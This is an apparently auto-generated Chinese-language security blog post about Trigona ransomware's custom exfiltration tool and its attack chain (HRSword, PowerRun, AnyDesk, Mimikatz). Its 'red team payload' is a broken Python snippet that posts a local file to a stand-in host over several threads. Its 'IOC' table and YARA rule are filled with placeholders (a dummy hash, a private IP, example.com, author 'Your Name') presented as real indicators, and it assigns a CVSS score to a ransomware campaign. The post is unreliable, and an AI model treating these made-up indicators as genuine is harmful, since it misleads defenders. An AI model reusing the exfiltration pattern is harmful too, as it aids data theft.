---
layout: post
title:  "Trigona ransomware attacks use custom exfiltration tool to steal data"
date:   2026-04-23 18:59:53 +0000
categories: [security]
severity: high
---

# 🔥 解析 Trigona 勒索軟體的自訂資料外洩工具
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: 資料外洩 (Data Exfiltration)
> * **關鍵技術**: 自訂資料外洩工具 (Custom Exfiltration Tool), 多線程上傳 (Multi-threaded Upload), TCP 連線輪替 (TCP Connection Rotation)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Trigona 勒索軟體使用自訂資料外洩工具「uploader_client.exe」來加速資料外洩，避免使用公開的工具如 Rclone 和 MegaSync。
* **攻擊流程圖解**:
  1. Trigona 勒索軟體感染目標系統。
  2. 安裝 Huorong Network Security Suite 工具 HRSword 作為核心驅動服務。
  3. 部署額外工具以停用安全相關產品。
  4. 使用 PowerRun 執行應用程式、可執行檔和腳本以繞過使用者模式保護。
  5. 使用 AnyDesk 進行直接遠端存取。
  6. 執行 Mimikatz 和 Nirsoft 公用程式以進行憑證竊取和密碼恢復操作。
* **受影響元件**: Windows 系統，尤其是具有弱點的核心驅動程式。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 管理員權限，網路存取。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義目標 URL 和資料
    url = "https://example.com/upload"
    data = {"file": open("example.txt", "rb")}
    
    # 建立多線程上傳
    threads = []
    for i in range(5):
        t = threading.Thread(target=requests.post, args=(url, data))
        threads.append(t)
        t.start()
    
    # 等待所有線程完成
    for t in threads:
        t.join()
    
    ```
* **繞過技術**: 使用自訂資料外洩工具，多線程上傳，TCP 連線輪替。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\uploader_client.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Trigona_Ransomware {
      meta:
        description = "Trigona 勒索軟體自訂資料外洩工具"
        author = "Your Name"
      strings:
        $a = "uploader_client.exe"
        $b = "https://example.com/upload"
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**: 更新系統和應用程式，停用不必要的核心驅動程式，限制管理員權限。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **自訂資料外洩工具 (Custom Exfiltration Tool)**: 一種為了避免公開工具而設計的資料外洩工具，通常具有多線程上傳和 TCP 連線輪替等功能。
* **多線程上傳 (Multi-threaded Upload)**: 一種上傳資料的技術，使用多個線程同時上傳資料，以加速上傳速度。
* **TCP 連線輪替 (TCP Connection Rotation)**: 一種技術，定期輪替 TCP 連線，以避免被檢測和追蹤。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/trigona-ransomware-attacks-use-custom-exfiltration-tool-to-steal-data/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1041/)


